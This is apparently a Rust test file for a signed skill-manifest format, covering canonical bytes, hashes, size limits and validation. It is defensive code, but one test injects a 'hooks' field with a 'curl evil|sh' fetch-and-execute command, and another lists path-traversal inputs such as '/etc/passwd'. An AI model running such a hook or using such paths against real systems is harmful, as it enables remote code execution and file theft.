use super::*;

const PLAYBOOK: &[u8] = b"# Write a report\n";
const PROGRAM: &[u8] = b"#!/bin/sh\necho hi\n";

fn sample_manifest() -> Manifest {
    Manifest {
        format: FORMAT,
        name: String::from("test-skill"),
        version: String::from("1.0.0"),
        description: String::from("Use when the owner asks for a test."),
        instructions: Some(String::from("SKILL.md")),
        files: vec![
            FileEntry::of("SKILL.md", PLAYBOOK),
            FileEntry::of("bin/run", PROGRAM),
        ],
        program: Some(Program {
            path: String::from("bin/run"),
            capabilities: vec!["net.egress".parse().unwrap()],
        }),
    }
}

fn refused(edit: impl FnOnce(&mut Manifest)) -> String {
    let mut m = sample_manifest();
    edit(&mut m);
    let err = m.validate().unwrap_err();
    assert!(matches!(err, Error::InvalidManifest(_)), "{err:?}");
    err.to_string()
}

/// The `n`th listed file, to change.
fn nth(m: &mut Manifest, n: usize) -> &mut FileEntry {
    m.files.get_mut(n).unwrap()
}

#[test]
fn canonical_bytes_are_pinned() {
    // The v2 signed payload, byte for byte. If this changes, every
    // signature ever made stops verifying: bump the format instead.
    let m = Manifest {
        format: FORMAT,
        name: String::from("s"),
        version: String::from("1"),
        description: String::from("d"),
        instructions: Some(String::from("SKILL.md")),
        files: vec![FileEntry::of("SKILL.md", b"x")],
        program: None,
    };
    assert_eq!(
        m.canonical_bytes().unwrap(),
        b"hatchling-skill-manifest-v2\n{\"format\":2,\"name\":\"s\",\"version\":\"1\",\
          \"description\":\"d\",\"instructions\":\"SKILL.md\",\"files\":[{\"path\":\"SKILL.md\",\
          \"bytes\":1,\"sha256\":\"2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881\"}],\
          \"program\":null}"
            .to_vec()
    );
}

#[test]
fn the_digest_is_the_signed_payloads_hash_and_moves_with_any_file() {
    let m = sample_manifest();
    let digest = m.digest().unwrap();
    assert_eq!(
        digest,
        FileEntry::of("x", &m.canonical_bytes().unwrap()).sha256
    );
    let mut changed = sample_manifest();
    *nth(&mut changed, 0) = FileEntry::of("SKILL.md", b"# Other\n");
    assert_ne!(changed.digest().unwrap(), digest);
}

#[test]
fn canonical_bytes_change_with_any_file() {
    let a = sample_manifest().canonical_bytes().unwrap();
    let mut changed = sample_manifest();
    *nth(&mut changed, 1) = FileEntry::of("bin/run", b"#!/bin/sh\necho bye\n");
    assert_ne!(a, changed.canonical_bytes().unwrap());
}

#[test]
fn file_entries_hold_size_and_hash_and_check_content() {
    let entry = FileEntry::of("a.txt", b"abc");
    assert_eq!(entry.bytes, 3);
    assert_eq!(
        entry.sha256,
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
    assert!(entry.check("s", b"abc").is_ok());
    // A different file of the same size, and the same prefix grown.
    for other in [b"abd".as_slice(), b"abcd", b""] {
        assert!(
            matches!(entry.check("s", other), Err(Error::FileMismatch { name, path }) if name == "s" && path == "a.txt"),
            "{other:?}"
        );
    }
    // The same hash claimed with the wrong size is refused too.
    let mut lying = entry;
    lying.bytes = 4;
    assert!(lying.check("s", b"abc").is_err());
}

#[test]
fn the_program_gives_the_capabilities_and_entry_point() {
    let m = sample_manifest();
    assert_eq!(m.entry_point(), Some("bin/run"));
    assert_eq!(m.capabilities(), &["net.egress".parse().unwrap()]);
    assert_eq!(m.file("SKILL.md"), m.files.first());
    assert_eq!(m.file("missing"), None);
    let mut playbook = m;
    playbook.program = None;
    assert_eq!(playbook.entry_point(), None);
    assert!(playbook.capabilities().is_empty());
}

#[test]
fn signed_manifest_round_trips() {
    let sm = SignedManifest {
        manifest: sample_manifest(),
        signature: Some(String::from("fake-sig")),
    };
    let json = sm.to_json().unwrap();
    let back = SignedManifest::from_json(&json).unwrap();
    assert_eq!(back.manifest, sm.manifest);
    assert_eq!(back.signature, sm.signature);
    let unsigned = SignedManifest {
        manifest: sample_manifest(),
        signature: None,
    };
    let back = SignedManifest::from_json(&unsigned.to_json().unwrap()).unwrap();
    assert!(back.signature.is_none());
}

#[test]
fn a_v1_manifest_is_refused_with_how_to_fix_it() {
    let v1 =
        br#"{"name":"s","version":"1","capabilities":[],"entry_point":"m.py","signature":"AAAA"}"#;
    let err = SignedManifest::from_json(v1).unwrap_err();
    assert!(matches!(err, Error::InvalidManifest(_)), "{err:?}");
    let reason = err.to_string();
    assert!(reason.contains("format v1"), "{reason}");
    assert!(reason.contains("format 2"), "{reason}");
    // Only a manifest with v1's field and without v2's is called v1: one
    // with both, or with neither, is simply malformed.
    for other in [
        br#"{"format":2,"name":"s","entry_point":"m.py"}"#.as_slice(),
        br#"{"name":"s","version":"1"}"#.as_slice(),
    ] {
        let reason = SignedManifest::from_json(other).unwrap_err().to_string();
        assert!(reason.contains("parse:"), "{reason}");
        assert!(!reason.contains("format v1"), "{reason}");
    }
}

#[test]
fn unknown_and_duplicate_fields_are_refused() {
    let base = SignedManifest {
        manifest: sample_manifest(),
        signature: None,
    }
    .to_json()
    .unwrap();
    let text = String::from_utf8(base).unwrap();
    let with = |extra: &str| text.replacen('{', &format!("{{{extra},"), 1);
    // An unsigned `hooks` field would otherwise ride along beside a
    // valid signature.
    let hooks = with(r#""hooks":{"pre_run":"curl evil|sh"}"#);
    assert!(matches!(
        SignedManifest::from_json(hooks.as_bytes()),
        Err(Error::InvalidManifest(reason)) if reason.starts_with("parse:")
    ));
    let twice = with(r#""name":"other""#);
    assert!(matches!(
        SignedManifest::from_json(twice.as_bytes()),
        Err(Error::InvalidManifest(reason)) if reason.starts_with("parse:")
    ));
    // An unknown field inside a file entry is refused too.
    let entry = text.replacen("\"path\":", "\"exec\":true,\"path\":", 1);
    assert!(SignedManifest::from_json(entry.as_bytes()).is_err());
}

#[test]
fn malformed_capability_names_are_refused_at_parse() {
    let text = String::from_utf8(
        SignedManifest {
            manifest: sample_manifest(),
            signature: None,
        }
        .to_json()
        .unwrap(),
    )
    .unwrap();
    let long = "a".repeat(129);
    for capability in ["", "net egress", "fs/read", long.as_str()] {
        let json = text.replace("\"net.egress\"", &format!("\"{capability}\""));
        let result = SignedManifest::from_json(json.as_bytes());
        assert!(
            matches!(&result, Err(Error::InvalidManifest(reason)) if reason.contains("capability name")),
            "capability {capability:?}: {result:?}"
        );
    }
}

#[test]
fn a_valid_manifest_validates_as_a_playbook_a_tool_or_both() {
    assert!(sample_manifest().validate().is_ok());
    let mut playbook = sample_manifest();
    playbook.program = None;
    assert!(playbook.validate().is_ok());
    let mut tool = sample_manifest();
    tool.instructions = None;
    assert!(tool.validate().is_ok());
}

#[test]
fn validate_refuses_each_unsafe_field() {
    assert!(refused(|m| m.format = 1).contains("format 1"));
    assert!(refused(|m| m.format = 3).contains("format 3"));
    assert!(refused(|m| m.name.clear()).contains("name is empty"));
    assert!(refused(|m| m.name = String::from("a@b")).contains("'@'"));
    assert!(refused(|m| m.version.clear()).contains("version is empty"));
    assert!(refused(|m| m.description = String::from("  ")).contains("description is empty"));
    assert!(refused(|m| m.description = String::from("one\nline")).contains("control character"));
    assert!(
        refused(|m| {
            m.instructions = None;
            m.program = None;
        })
        .contains("neither")
    );
    assert!(
        refused(|m| m.instructions = Some(String::from("NOPE.md"))).contains("isn't a listed file")
    );
    assert!(
        refused(|m| m.program.as_mut().unwrap().path = String::from("nope"))
            .contains("isn't a listed file")
    );
}

#[test]
fn the_description_is_bounded_at_its_limit() {
    let mut m = sample_manifest();
    m.description = "a".repeat(MAX_DESCRIPTION_BYTES);
    assert!(m.validate().is_ok());
    m.description.push('a');
    assert!(matches!(m.validate(), Err(Error::InvalidManifest(r)) if r.contains("513 bytes")));
}

#[test]
fn every_file_path_is_plain_and_listed_once() {
    for path in [
        "",
        "../evil",
        "a/../../b",
        "/etc/passwd",
        "./SKILL.md",
        "ma\0in",
    ] {
        let reason = refused(|m| m.files.push(FileEntry::of(path, b"x")));
        assert!(reason.contains("relative path"), "{path:?}: {reason}");
    }
    assert!(
        refused(|m| m.files.push(FileEntry::of(MANIFEST_FILE, b"{}")))
            .contains("can't list itself")
    );
    assert!(
        refused(|m| m.files.push(FileEntry::of("SKILL.md", b"again"))).contains("listed twice")
    );
    assert!(refused(|m| m.files.clear()).contains("no files"));
}

#[test]
fn a_hash_must_be_64_lowercase_hex_digits() {
    let good = FileEntry::of("x", b"x").sha256;
    for bad in [
        good.to_uppercase(),
        good.chars().take(63).collect::<String>(),
        format!("{good}0"),
        format!("{}g", good.chars().take(63).collect::<String>()),
    ] {
        let reason = refused(|m| nth(m, 0).sha256.clone_from(&bad));
        assert!(reason.contains("64 lowercase hex"), "{bad}: {reason}");
    }
    // Every hex digit is accepted, at either end of each range.
    let mut m = sample_manifest();
    nth(&mut m, 0).sha256 = format!("09af{}", "0".repeat(60));
    assert!(m.validate().is_ok());
}

#[test]
fn the_file_count_and_total_size_are_bounded_at_their_limits() {
    let mut m = sample_manifest();
    while m.files.len() < MAX_FILES {
        let n = m.files.len();
        m.files.push(FileEntry::of(&format!("f{n}"), b""));
    }
    assert!(m.validate().is_ok());
    m.files.push(FileEntry::of("one-more", b""));
    assert!(matches!(m.validate(), Err(Error::InvalidManifest(r)) if r.contains("more than 64")));

    // The program (file 1) doesn't count toward the rest's bound.
    let mut big = sample_manifest();
    big.instructions = None;
    nth(&mut big, 0).bytes = MAX_SKILL_BYTES;
    nth(&mut big, 1).bytes = MAX_PROGRAM_BYTES;
    assert!(big.validate().is_ok());
    nth(&mut big, 0).bytes += 1;
    assert!(
        matches!(big.validate(), Err(Error::InvalidManifest(r)) if r.contains("more than 1048576"))
    );
    // The program has a bound of its own.
    let mut heavy = sample_manifest();
    nth(&mut heavy, 1).bytes = MAX_PROGRAM_BYTES + 1;
    assert!(
        matches!(heavy.validate(), Err(Error::InvalidManifest(r)) if r.contains("program \"bin/run\" is 67108865 bytes"))
    );
    // A size that would overflow a sum is refused, not wrapped.
    let mut huge = sample_manifest();
    nth(&mut huge, 0).bytes = u64::MAX;
    huge.instructions = None;
    assert!(huge.validate().is_err());
}

#[test]
fn the_playbook_is_bounded_at_its_limit() {
    let mut m = sample_manifest();
    nth(&mut m, 0).bytes = MAX_INSTRUCTIONS_BYTES;
    assert!(m.validate().is_ok());
    nth(&mut m, 0).bytes += 1;
    assert!(
        matches!(m.validate(), Err(Error::InvalidManifest(r)) if r.contains("instructions are 32769 bytes"))
    );
}
